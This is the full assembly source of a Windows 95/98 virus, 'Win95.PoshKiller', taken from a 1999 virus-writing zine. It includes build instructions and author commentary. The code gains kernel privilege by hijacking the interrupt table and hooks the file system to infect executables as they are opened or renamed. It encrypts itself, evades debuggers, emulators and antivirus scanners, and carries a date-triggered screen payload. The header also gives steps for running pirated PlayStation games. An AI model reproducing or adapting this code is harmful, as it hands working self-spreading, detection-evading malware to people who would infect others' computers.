   ;                                        /-----------------------------\
   ;                                        | Xine - issue #4 - Phile 209 |
   ;                                        \-----------------------------/

   ; [Win95.PoshKiller] - Ring-0 resident PE infector
   ; Copyright (c) 1999 by Billy Belcebu/iKX
   ;
   ; Virus Name    : PoshKiller
   ; Virus Author  : Billy Belcebu/iKX
   ; Origin        : Spain
   ; Platform      : Win95/98
   ; Target        : PE files (EXE,SCR,CPL)
   ; Compiling     : TASM 5.0 and TLINK 5.0 should be used
   ;                       tasm32 /ml /m3 poshkill,,;
   ;                       tlink32 /Tpe /aa /c /v poshkill,poshkill,,import32.lib,
   ;                       pewrsec poshkill.exe
   ; Features      : Well, here goes the list of what does this virus:
   ;                 ù Ring-0 virus by means of modifying the IDT.
   ;                 ù Win9X resident encrypted PE infector (EXE/SCR/CPL).
   ;                 ù Anti-emulators (FPU in decryptor, make fake GPFs).
   ;                 ù Anti-debugger (SEH, Anti-SoftICE, INT 3).
   ;                 ù Anti-monitors (with Super's kinda tunneling trick).
   ;                 ù Anti-heuristics (not detected by AVP32,NODICE32,etc).
   ;                 ù Infects on open, rename and in attribute change.
   ;                 ù Used Pentium instructions.
   ;                 ù Graphical payload, thanx to the p0rt g0d nIgr0 :)
   ; Payload       : The  first  graphical  payload  FULL WORKING in Ring-0, coz
   ;                 it uses ports for perform its action. It scrolls the screen
   ;                 contents from right to left. The payload was coded with the
   ;                 knowledge, ideas and presence of nIgr0.
   ; Notes         : Well, about the name of the virus, i think it's quite clear
   ;                 I hate those  poshes, their  attitude, their world slave of
   ;                 capitalism, slave of the  fascism of the fashion, trying to
   ;                 keep being the beautiful people... There  are MANY of those
   ;                 around my life, but i try to be isolated from them, i don't
   ;                 want to be as sick as them :) But, at  least, let me say an
   ;                 existencial  question that  hurts  me... Why the posh girls
   ;                 are the preetiest  girls around? Hehehe, i ask this because
   ;                 it is a constant in  my life: i know some impressive preety
   ;                 girls, and ALL them are really (and sadly) posh.
   ;                 Well, the worst is when a posh is also  catholic, but  this
   ;                 is another  history... I also  know some  of them (boys and
   ;                 girls), and they hate me as i hate'em. Nice, heh? :)
   ; Miscellaneous : VERY INTERESTING! :) If  some of  you have a PlayStation (i
   ;                 know many people that waste their time playing with it, but
   ;                 anyway...), and you want to use pirate games, and you don't
   ;                 trust in anyone for put the goddamn multisystem chip, there
   ;                 is a trick for use the pirate  games without installing the
   ;                 chip. You'll need, of  course, a playstation, and  at least
   ;                 one original  game (a demo  can be used too), and  a pirate
   ;                 game. Firstly, you must make your playstation to be able to
   ;                 keep opened the CD drive  while running games (this is done
   ;                 by a simple trick that most of you already know). Well, the
   ;                 trick consists in the following:
   ;                 1ø Put the original CD in its place, and you'll see how the
   ;                 playstation begins  to rotate it. But you will see that af-
   ;                 ter a few seconds, it slowdown  a little the rotation. Then
   ;                 you  must  substitute  the  original  CD by the pirate one.
   ;                 2ø Then you'll  see  how the pirate CD begins its rotation,
   ;                 and then, after a  few seconds you'll see that it slowdowns
   ;                 the rotation, and then substitute the pirate CD by the ori-
   ;                 ginal CD.
   ;                 3ø Now follows the hardest part. The original CD will begin
   ;                 it's rotation. And after 1 second  you'll hear a "clic" so-
   ;                 und. Now it's the moment. Substitute fastly the original CD
   ;                 with the pirate CD and... Voil…! :)
   ;
   ;                 The horrible people, the horrible people
   ;               It's as anatomic as the size of your stepple
   ;                    Capitalism has made it this way
   ;                         Old fashioned fascism
   ;                         will take it away!!!!
   ;
   ;                            -Marilyn Manson-
   ;
   ; Amunt ValŠncia!!! la copa Šs nostra!!! (26-6-99),
   ; Billy Belcebu/iKX
   ;

   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   ; ³ Constants, data and another shit                                        ³
   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

           .586p                                   ; Really needed!
           .model  flat                            ; Hehehe i love 32 bit stuph ;)

   TRUE                            equ     1
   FALSE                           equ     0

   DEBUG                           equ     TRUE    ; Oh my beloved SoftIce... :)

   ; VxD functions used

   VMM_Get_DDB                     equ     00010146h
   IFSMgr_GetHeap                  equ     0040000Dh
   IFSMgr_RetHeap                  equ     0040000Eh
   IFSMgr_Ring0_FileIO             equ     00400032h
   UniToBCSPath                    equ     00400041h
   IFSMgr_InstallFileSystemApiHook equ     00400067h

   ; IFSMgr_Ring0_FileIO functions used

   R0_DELETEFILE                   equ     04100h
   R0_FILEATTRIBUTES               equ     04300h
   R0_OPENCREATFILE                equ     0D500h
   R0_CLOSEFILE                    equ     0D700h
   R0_READFILE                     equ     0D600h
   R0_WRITEFILE                    equ     0D601h
   R0_GETFILESIZE                  equ     0D800h

   ; FileSystem intercepted functions

   IFSFN_FILEATTRIB                equ     21h
   IFSFN_OPEN                      equ     24h
   IFSFN_RENAME                    equ     25h

   ; Constants of the virus

   virus_size                      equ     (offset virus_end-offset virus_start)
   encrypt_size                    equ     (offset virus_end-offset encrypt_start)
   size_to_allocate                equ     virus_size+2048
   section_flags                   equ     00000020h or 20000000h or 80000000h
   rva_key                         equ     (offset KeyEnc-offset virus_start)

   IF DEBUG
   Interrupt                       equ     05h
   ELSE
   Interrupt                       equ     03h ; Let'z antidebug their arse
   ENDIF

   rdtcs                           equ     <dw 310Fh>

   ; Macro for make the VxD Calls required

   VxDCall macro   VxDService
           local   @@@@@@
           int     20h                     ; CD 20                 +00
           dd      VxDService              ; XX XX XX XX           +02
           jmp     @@@@@@                  ; EB 04                 +06
           dd      VxDService              ; XX XX XX XX           +08
   @@@@@@:
           endm

   ; Sufrir s... PIJO DE MIERDA! El poder del metal... El castigo infernal...

   extrn   ExitProcess:PROC
   extrn   MessageBoxA:PROC

           .data

   szTitle         db      "Win9X.PoshKiller."
                   db      virus_size/1000 mod 10 +"0"
                   db      virus_size/0100 mod 10 +"0"
                   db      virus_size/0010 mod 10 +"0"
                   db      virus_size/0001 mod 10 +"0"
                   db      00h

   szMessage       db      "C'mon posh. I believe in myself and in anyone else,",10
                   db      "while you believe in the capitalism; i innovate,",10
                   db      "you copy; i live, you don't. Why? I killed you.",10
                   db      "Copyright (c) 1999 by Billy Belcebu/iKX",10

   ; Mi vezino me atormenta, todo el dia en los 40, le ha soplado a mi vieja ke
   ; bebo mas de la kuenta... "Como le pille en la eskalera... me lo kargo a
   ; guitarrazos!"

           .code

   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   ; ³ Initialize virus, and get Ring-0 privilege                              ³
   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

   virus_start     label   byte

   poshkiller:
   IF      DEBUG
           int     3
   ENDIF
           pushad

           jmp     kutre_delta                     ; 'sup? i don't like the
   petakakas:                                      ; ussual method: AVP32 catches
           pop     edi                             ; it :)

           mov     ecx,encrypt_size/4              ; ECX = Encrypted size in DWORDS

           call    overkey
   KeyEnc  dd      00000000h
   TempByt dd      00000000h
   overkey:
           pop     esi                             ; ESI = Pointer to enc. key
           mov     edx,[esi]
           mov     ebx,esi
           add     ebx,4                           ; EBX = Pointer to a temp dword

           finit                                   ; Initialize math coprocessor

   ; Megafast FPU decryption!

   eloop:  fild    dword ptr [edi]                 ; Push the dword to decrypt
           fistp   dword ptr [ebx]                 ; Pop in temporal address
           xor     dword ptr [ebx],edx             ; Decrypt dword in that address
           fild    dword ptr [ebx]                 ; Push decrypted integral
           fistp   dword ptr [edi]                 ; Store the decrypted integral
           add     edi,4                           ; Actualize counter
           loop    eloop                           ; Loop until all is decrypted
           jmp     strip                           ; And go over that shitty call

   kutre_delta:                                    ; Shitty method for get
           call    petakakas                       ; inital address to decrypt

   encrypt_start   label   byte

           db      " [IAIDA] "                    ; Here she is! The girl with
                                                   ; the sweetest smile i've ever
                                                   ; know... also the best in
                                                   ; many other fields :)~

   ; Psch‚, quiz  si sea un babosillo :) Pero, joder, no la conoceis...
   ; (ni quiero que lo hagais mamones!!! Es m¡a y solo m¡a!!! X-DDD)

   strip:  call    getdeltax                       ; Ol' good days delta offset!
   getdeltax:
           pop     ebp
           mov     eax,ebp
           sub     ebp,offset getdeltax

           sub     eax,(offset getdeltax-offset poshkiller)
           sub     eax,00001000h                   ; Get imagebase at runtime
   newEIP  equ     $-4
           mov     dword ptr [ebp+ibase],eax

           call    SetUpSEH
           mov     esp,[esp+8]                     ; Restore stack if fault
           call    restore_old_bytes               ; Fix this shit
           jmp     DeactivateSEH
   SetUpSEH:
           xor     ebx,ebx                         ; Setup SEH
           push    dword ptr fs:[ebx]
           mov     fs:[ebx],esp

           push    edx
           sidt    fword ptr [esp-2]               ; Interrupt table to stack
           pop     edx

           add     edx,(Interrupt*8)+4             ; Get interrupt vector

           mov     ebx,[edx]
           mov     bx,word ptr [edx-4]             ; Grmffxzxmfmfmzmzxxxxggrrr...

           lea     edi,[ebp+InterruptHandler]      ; Wheeeeehoooowww?

           mov     [edx-4],di
           shr     edi,16                          ; Move MSW to LSW
           mov     [edx+2],di

           int     Interrupt                       ; Ring-0 jump!

           mov     [edx-4],bx                      ; Restore old interrupt values
           shr     ebx,16                          ; ROR, SHR, SAR... who cares?
           mov     [edx+2],bx

           or      ebp,ebp                         ; 1st generation shitzor
           jz      host

           call    restore_old_bytes               ; Restore host's first bytes

   DeactivateSEH:
           xor     ebx,ebx                         ; Restore old SEH handler
           pop     dword ptr fs:[ebx]
           pop     edx

   back2host:
           popad
           mov     ebx,00400000h                   ; Imagebase obtained at
   ibase   equ     $-4                             ; runtime
           add     ebx,00001000h                   ; Old EIP, patched during
   base    equ     $-4                             ; infection time

           fninit                                  ; Uninitialize coprocessor

           push    ebx                             ; Return to host
           ret

   ; SHOOT SHOOT SHOOT MOTHERFUCKER!!!!!!!!!!!!!

   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   ; ³ Restore original host's first bytes                                     ³
   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

   restore_old_bytes:
           mov     edi,dword ptr [ebp+ibase]       ; Restore first bytes
           add     edi,dword ptr [ebp+base]        ; EDI = Old EIP
           lea     esi,[ebp+oldjmpy]               ; ESI = Original bytes
           mov     ecx,sjumpy
           rep     movsb
           ret

   ; I went to god just to see and i was looking at me!

   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   ; ³ Ring-0 code                                                             ³
   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

   InterruptHandler:
           pushad

           call    shitz0r                         ; Get Ring-0 delta offset
   shitz0r:
           pop     ebp
           sub     ebp,offset shitz0r

           IFNDEF  DEBUG
           mov     eax,202h                        ; Detect SoftICE
   @@5:    VxDCall VMM_Get_DDB
           jecxz   no_softice
           jmp     r3_back                         ; If it's there, avoid install
   no_softice:                                     ; the virus ;)
           ENDIF

           mov     eax,dr2
           cmp     eax,"LLIK"                      ; Are we resident?
           jz      r3_back                         ; Yez, go away

           push    size_to_allocate                ; Get Memory from the heap
   @@1:    VxDCall IFSMgr_GetHeap
           pop     ecx                             ; Fucking VxD services... :)

           or      eax,eax                         ; Function succesful?
           jz      r3_back                         ; Back to the boring Ring-3! :(

           and     byte ptr [ebp+semaphore],0      ; Reset semaphore variable :)

           xchg    edi,eax                         ; Where move virus

           push    edi                             ; And save it for later
           lea     esi,[ebp+poshkiller]
           mov     ecx,virus_size
           rep     movsb                           ; Move virus to its TSR location ;)
           pop     edi

           lea     ecx,[edi+New_Handler]           ; Install FileSystem Hook
           push    ecx
   @@2:    VxDCall IFSMgr_InstallFileSystemApiHook
           pop     ecx

           xchg    esi,eax                         ; ESI = Last hook handler
           push    esi
           add     esi,4                           ; ESI = Hook info
   tunnel: lodsd
           xchg    eax,esi
           add     esi,08h
           js      tunnel                          ; If ESI < 7FFFFFFF, it was
                                                   ; the last one :)
           mov     dword ptr [edi+ptr_top_chain],eax ; Save in its var in mem
           pop     eax                             ; EAX = Last hook handler
           mov     dword ptr [edi+Old_Handler],eax

           mov     eax,"LLIK"                      ; Kewl residence mark :)
           mov     dr2,eax

   r3_back:
           popad
           iretd                                   ; return to Ring-3 :(

   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   ; ³ FileSystem hook                                                         ³
   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

   New_Handler equ  $-(offset virus_start)

   FSA_Hook:
           enter   20h,00h                         ; Create stack frame

   ; Some useful stuff in stack, now in EBP
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ; [EBP+1Ch] -> pointer to IOREQ structure.
   ; [EBP+18h] -> codepage that the user string was passed in on.
   ; [EBP+14h] -> kind of resource the operation is being performed on.
   ; [EBP+10h] -> the 1-based  drive the operation is being performed on
   ;              (-1 if UNC).
   ; [EBP+0Ch] -> function  that  is being performed.
   ; [EBP+08h] -> address  of the  FSD function  that is to be called for this
   ;              API.

           mov     ecx,6                           ; Push all that with a loop,
           mov     ebx,1Ch                         ; that's is the most optimized
   pushit: mov     eax,[ebp+ebx]                   ; way to do this :)
           push    eax
           sub     ebx,4
           loop    pushit

           mov     eax,dword ptr [ebp+0Ch]         ; EAX = Function
           not     eax

           cmp     eax,not IFSFN_OPEN              ; File Open? Infect if it is
           jz      infect

           cmp     eax,not IFSFN_RENAME            ; File Rename? Infect if it is
           jz      infect

           cmp     eax,not IFSFN_FILEATTRIB            ; File Attribute change?
           jz      infect                          ; Infect if it is

   back2oldhandler:
           db      0B8h                            ; MOV EAX,imm32 opcode
   Old_Handler     equ  $-(offset virus_start)
   OldFSA  dd      00000000h
           call    [eax]                           ; Call previous handler
           add     esp,18h                         ; Fix stack
           leave
           ret

   infect:
           pushad
           call    ring0_delta                     ; Get delta offset of this
   ring0_delta:
           pop     ebx
           sub     ebx,offset ring0_delta

           cmp     byte ptr [ebx+semaphore],00h    ; Avoid recursive infection :)
           jnz     pushnback

           inc     byte ptr [ebx+semaphore]        ; Red light semaphore! :)

           lea     esi,dword ptr [ebx+top_chain]   ; Make null top chain, so we
           lodsd                                   ; avoid monitors by means of
           xor     edx,edx                         ; cutting their balls :)
           xchg    [eax],edx

           pushad
           call    infection_stuff                 ; Infect!
           popad

           mov     [eax],edx                       ; Restore top chain

           dec     byte ptr [ebx+semaphore]        ; Green light!

   pushnback:
           popad
           jmp     back2oldhandler

   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   ; ³ Infect file if EXE                                                      ³
   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

   infection_stuff:
           lea     edi,[ebx+fname]
           push    edi
           mov     eax,[ebp+10h]
           cmp     al,0FFh
           jz      wegotdrive
           add     al,"@"
           stosb
           mov     al,":"
           stosb

   wegotdrive:
           xor     eax,eax
           push    eax                             ; push 00h
           inc     ah
           push    eax                             ; push 100h
           mov     eax,[ebp+1Ch]
           mov     eax,[eax+0Ch]
           add     eax,4
           push    eax                             ; push offset unicode_filename
           push    edi                             ; push offset asciiz_filename

   @@3:    VxDCall UniToBCSPath                    ; Convert to ASCII

           add     esp,10h
           add     edi,eax
           xor     eax,eax                         ; Make string null-terminated
           stosb

           pop     edi                             ; Get end of string :)
           xor     al,al
           scasb
           jnz     $-1

           mov     eax,dword ptr [edi-05h]         ; EAX = Extension of file
           or      eax,20202020h                   ; make lowercase extension
           not     eax                             ; no, no, no!! :)

           cmp     eax,not "exe."                  ; Infect if EXE file
           jz      itsveryfunny
           cmp     eax,not "lpc."                  ; Infect if CPL file
           jz      itsveryfunny
           cmp     eax,not "rcs."                  ; Infect if SRC file
           jz      itsveryfunny

           jmp     notsofunny

   itsveryfunny:
           IF      DEBUG                           ; Only if debugging shitz0rz
           cmp     dword ptr [edi-0Ch],"TAOG"      ; If not a goat, don't execute
           jnz     notsofunny
           ENDIF

           call    payload                         ; Lauch payload (if date matchz)


           lea     edi,[ebx+fname]
           pushad
           call    AvoidShitFiles
           popad
           jc      notsofunny

           mov     esi,edi                         ; Get File Attributes
           mov     eax,R0_FILEATTRIBUTES
           push    eax
           call    R0_FileIO
           pop     eax

           jc      notsofunny

           push    esi                             ; Save'em
           push    ecx

           xor     ecx,ecx                         ; Clear attributes
           inc     eax
           push    eax
           call    R0_FileIO

           jc      stillnotsofunny

           mov     esi,edi                         ; Open file a'la DOS
           mov     eax,R0_OPENCREATFILE
           xor     ecx,ecx
           mov     edx,ecx
           inc     edx                             ; EDX = 1
           mov     ebx,edx
           inc     ebx                             ; EBX = 2
           call    R0_FileIO

           jc      stillnotsofunny

           xchg    eax,ebx                         ; hehehe... as we did in DOS :)

           call    inf_delta                       ; Plurg... Delta offset!
   inf_delta:
           pop     ebp
           sub     ebp,offset inf_delta

           mov     eax,R0_READFILE                 ; Read the dword that marks
           push    eax                             ; us the beginning of PE
           mov     ecx,4                           ; header
           mov     edx,03Ch
           lea     esi,[ebp+pehead]                ; There goez the PE header offzet
           call    R0_FileIO

           pop     eax
           mov     edx,dword ptr [ebp+pehead]      ; Now read 1024 bytes of PE
           lea     esi,[ebp+header]                ; header. I think it's enough.
           mov     ecx,400h
           call    R0_FileIO

           cmp     dword ptr [esi],"EP"            ; Is it PE?
           jnz     muthafucka

           cmp     dword ptr [esi+4Ch],"HSOP"      ; Was it already infected?
           jz      muthafucka
           mov     dword ptr [esi+4Ch],"HSOP"      ; Damned poshes

           mov     edi,esi                         ; Save in EDI the PE offset

   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   ; ³ PE Infection routinez                                                   ³
   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

           movzx   eax,word ptr [edi+06h]          ; Get last section of header
           dec     eax
           imul    eax,eax,28h
           add     esi,eax
           add     esi,78h
           mov     edx,[edi+74h]
           shl     edx,03h
           add     esi,edx                         ; ESI = last section header
                                                   ; EDI = PE header
           mov     edx,[esi+10h]                   ; EDX = SizeOfRawData
           mov     eax,edx                         ; EAX = SizeOfRawData
           add     edx,[esi+0Ch]                   ; EDX = New EIP
           add     eax,[esi+14h]                   ; EAX = Where append virus
           push    eax                             ; Save it

           push    dword ptr [esi+10h]             ; Save actual SizeOfRawData

           mov     eax,virus_size                  ; EAX = VirusSize
           add     eax,[esi+10h]                   ; EAX = VirusSize+SizeOfRawData
           mov     ecx,[edi+3Ch]                   ; ECX = Alignment
           call    align                           ; Align it!
           mov     [esi+10h],eax                   ; EAX = New SizeOfRawData &
           mov     [esi+08h],eax                   ; New VirtualSize

           add     eax,[esi+0Ch]                   ; EAX = New SizeOfCode
           mov     [edi+50h],eax                   ; Put it!

           pop     eax                             ; EAX = Old SizeOfRawData
           mov     ecx,[esi+10h]                   ; ECX = New SizeOfRawData
           sub     ecx,eax                         ; Get the difference (size to
           push    ecx                             ; append) and save it

           mov     eax,[edi+28h]                   ; EAX = Host's EIP
           mov     dword ptr [ebp+base],eax        ; Save it
           mov     dword ptr [ebp+newEIP],edx      ; And where virus begins

           sub     edx,eax                         ; Contruct relative offset
           sub     edx,sjumpy                      ; for make the jump
           mov     dword ptr [ebp+(jumpy+1)],edx   ; Store the address

           or      [esi+24h],section_flags         ; Update section's flagz

           mov     esi,edi
           add     esi,0F8h-28h                    ; Pointer to 1st section-28h
   nigger: add     esi,28h                         ; Ptr to section name ;)
           mov     edx,eax                         ; Put in EDX the original EIP
           sub     edx,[esi+0Ch]                   ; Remove the VirtualAddress
           cmp     edx,[esi+08h]                   ; Is EIP pointing to this sec?
           jae     nigger                          ; If not, loop again

           or      [esi+24h],section_flags         ; Put sum attributes

           push    esi                             ; Read first bytes beginning
           mov     eax,R0_READFILE                 ; from the EIP, the first
           add     edx,[esi+14h]                   ; bytes that are executed
           lea     esi,[ebp+oldjmpy]               ; by the program, and save'em
           mov     ecx,sjumpy
           call    R0_FileIO
           pop     esi

           mov     eax,R0_WRITEFILE                ; Write it some shit to pass
           mov     ecx,sjumpy                      ; the control to the virus
           push    esi                             ; See jumpyx label for more
           lea     esi,[ebp+jumpyx]                ; details ;)
           call    R0_FileIO
           pop     esi

   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   ; ³ Append, and close file                                                  ³
   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

           mov     eax,R0_WRITEFILE                ; Write the modified header
           mov     ecx,400h                        ; to the file
           mov     edx,dword ptr [ebp+pehead]
           lea     esi,[ebp+header]
           call    R0_FileIO

           push    virus_size                      ; Allocate the virus size
   @@6:    VxDCall IFSMgr_GetHeap
           pop     ecx

           mov     dword ptr [ebp+temp_addr],eax

           pushad
           call    VxDFix
           popad

           xchg    eax,edi                         ; Copy virus to temporal
           push    edi                             ; heap chunk
           lea     esi,[ebp+virus_start]
           rep     movsb
           pop     esi

           push    esi

           rdtcs                                   ; Get a random number
           xchg    eax,edx
           mov     dword ptr [esi+rva_key],edx     ; Save encrypt key in virus
           add     esi,virus_size-encrypt_size
           mov     edi,esi
           mov     ecx,encrypt_size/4

   el00p:  lodsd                                   ; Encrypt virus
           xor     eax,edx
           stosd
           loop    el00p

           pop     esi                             ; ESI = Ptr to virus_start

           pop     ecx                             ; ECX = Size (rounded) to append
           pop     edx                             ; EDX = Ptr where append

           mov     eax,R0_WRITEFILE                ; Append virus
           call    R0_FileIO

           push    dword ptr [ebp+temp_addr]
   @@7:    VxDCall IFSMgr_RetHeap                  ; Free memory used by 2nd copy
           pop     ecx

           IF      DEBUG
           pushad
           call    beepy
           popad
           ENDIF

   muthafucka:
           mov     eax,R0_CLOSEFILE                ; Close file
           call    R0_FileIO

   stillnotsofunny:
           pop     eax                             ; Restore its attributes
           pop     ecx
           pop     esi
           call    R0_FileIO

   notsofunny:
           ret

   R0_FileIO:                                      ; Optimize for the table
   @@4:    VxDCall IFSMgr_Ring0_FileIO
           ret

   ; On input:
   ;       EAX = Number to align
   ;       ECX = Alignment factor
   ; On output:
   ;       EAX = Aligned number

   align:
           push    edx
           xor     edx,edx
           push    eax
           div     ecx
           pop     eax
           sub     ecx,edx
           add     eax,ecx
           pop     edx
           ret

   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   ; ³ Graphical payload if date is 26th of October                            ³
   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

   payload:
           mov     al,07h                          ; Get date
           out     70h,al
           in      al,71h

           cmp     al,26h                          ; Is it 26th?
           jnz     no_payload                      ; No, shit.

           mov     al,08h                          ; Get month
           out     70h,al
           in      al,71h

           cmp     al,10h                          ; Is it 10th?
           jnz     no_payload                      ; No, shit.

           xor     ebx,ebx                         ; Make 0 the counter
           xor     ecx,ecx
           dec     ecx                             ; Make -1 the repeatition :)

   scroll:
           mov     edx,03D4h                       ; Graphical payload by using
           mov     al,0Ch                          ; ports. Original code in
           out     dx,al                           ; ATT assembler by nIgr0, and
           mov     edx,03D5h                       ; adapted by him and me at my
           mov     al,bh                           ; home the 30th of June :)
           out     dx,al                           ; Thanx nIgr0! Go on with
           mov     edx,03D4h                       ; "that" thingy :)
           mov     al,0Dh
           out     dx,al
           mov     edx,03D5h
           mov     al,bl
           out     dx,al
           inc     ebx
           push    ecx
           mov     ecx,0000FFFFh                   ; Some delay, for slowdown a
           loop    $                               ; little the effect
           pop     ecx
           loop    scroll

   no_payload:
           ret

   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   ; ³ Avoid infection of certain files                                        ³
   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

   AvoidShitFiles:
           lea     esi,[ebx+@@BadProgramz]         ; Ptr to table
           mov     eax,"."                         ; Search filename for a dot
           scasb
           jnz     $-1
           mov     eax,"\"                         ; Now reverse the direction and search
           std                                     ; for the last \
           scasb
           jnz     $-1
           inc     edi                             ; Fix it
           inc     edi
           cld
   ASF_Loop:
           xor     eax,eax                         ; Clear EAX
           lodsb                                   ; Load size of string in AL
           cmp     al,0BBh                         ; End of table?
           jz      AllShitFilesProcessed           ; Oh, shit!
           xchg    eax,ecx                         ; Put Size in ECX
           push    edi                             ; Preserve program pointer
           rep     cmpsb                           ; Compare both strings
           pop     edi                             ; Restore program pointer
           jz      ShitFileFound                   ; Damn, a shitty file!
           add     esi,ecx                         ; Pointer to another string
           jmp     ASF_Loop                        ; in table & loop
   AllShitFilesProcessed:
           mov     cl,00h                          ; Overlap, so CL = 0F9h
           org     $-1
   ShitFileFound:
           stc                                     ; Set carry
           ret

   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   ; ³ Fix all VxDCallz                                                        ³
   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

   VxDFix:
           mov     ecx,VxDTbSz                     ; Number of VxDs
           lea     esi,[ebp+VxDTblz]               ; Pointer to table
   @lo0pz: lodsd                                   ; Load current offset in EAX
           add     eax,ebp                         ; Add delta :)
           mov     word ptr [eax],20CDh            ; Put in that address
           mov     edx,dword ptr [eax+08h]         ; Get VxD Service value
           mov     dword ptr [eax+02h],edx         ; And restore it
           loop    @lo0pz
           ret

   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   ; ³ Interesting tables                                                      ³
   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

   VxDTblz label   byte
           dd      offset (@@1)                    ; IFSMgr_GetHeap
           dd      offset (@@2)                    ; IFSMgr_InstallFileSystemApiHook
           dd      offset (@@3)                    ; UniToBCSPath
           dd      offset (@@4)                    ; IFSMgr_Ring0_FileIO
           IFNDEF  DEBUG
           dd      offset (@@5)                    ; VMM_Get_DDB
           ENDIF
           dd      offset (@@6)                    ; IFSMgr_GetHeap
           dd      offset (@@7)                    ; IFSMgr_RetHeap
   VxDTbSz equ     (($-offset VxDTblz)/4)          ; Numbah of VxDCalls in code

   ; Files to ignore, don't infect'em!

   @@BadProgramz   label   byte
           db      02h,"TB"                        ; ThunderByte?
           db      02h,"F-"                        ; F-Prot?
           db      03h,"NAV"                       ; Norton Antivirus?
           db      03h,"AVP"                       ; AVP?
           db      03h,"WEB"                       ; DrWeb?
           db      03h,"PAV"                       ; Panda?
           db      03h,"DRW"                       ; DrWeb?
           db      04h,"DSAV"                      ; Dr Solomon?
           db      03h,"NOD"                       ; Nod-Ice?
           db      06h,"WINICE"                    ; SoftICE?
           db      06h,"FORMAT"                    ; Format?
           db      05h,"FDISK"                     ; Fdisk?
           db      08h,"SCANDSKW"                  ; ScanDisk?
           db      06h,"DEFRAG"                    ; Defrag?
           db      0BBh

   ; For jump building

   jumpyx  label   byte
           call    seh_tricky
           mov     esp,[esp+08h]
           xor     edx,edx
           pop     dword ptr fs:[edx]
           pop     edx
   jumpy:  db      0E9h
           dd      00000000h
   seh_tricky:
           xor     edx,edx
           push    dword ptr fs:[edx]
           mov     fs:[edx],esp
           dec     byte ptr [edx]                  ; DIE EMULATORS!!!!!!
   sjumpy  equ     ($-offset jumpyx)

   ; Store here overwritten data

   oldjmpy db      sjumpy dup (00h)

   ; My mark :)

   mark    db      "[Win95.PoshKiller v1.00]",0
           db      "(c) 1999 Billy Belcebu/iKX",0

           IF      DEBUG
   beepy:
           mov     ax, 1000
           mov     bx, 200
           mov     cx, ax
           mov     al, 0b6h
           out     43h, al
           mov     dx, 0012h
           mov     ax, 34dch
           div     cx
           out     42h, al
           mov     al, ah
           out     42h, al
           in      al, 61h
           mov     ah, al
           or      al, 03h
           out     61h, al
           l1:
           mov     ecx, 4680
           l2:
           loop    l2
           dec     bx
           jnz     l1
           mov     al, ah
           out     61h, al
           ret
           ENDIF
   virus_end       label   byte

   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   ; ³ Data in the heap                                                        ³
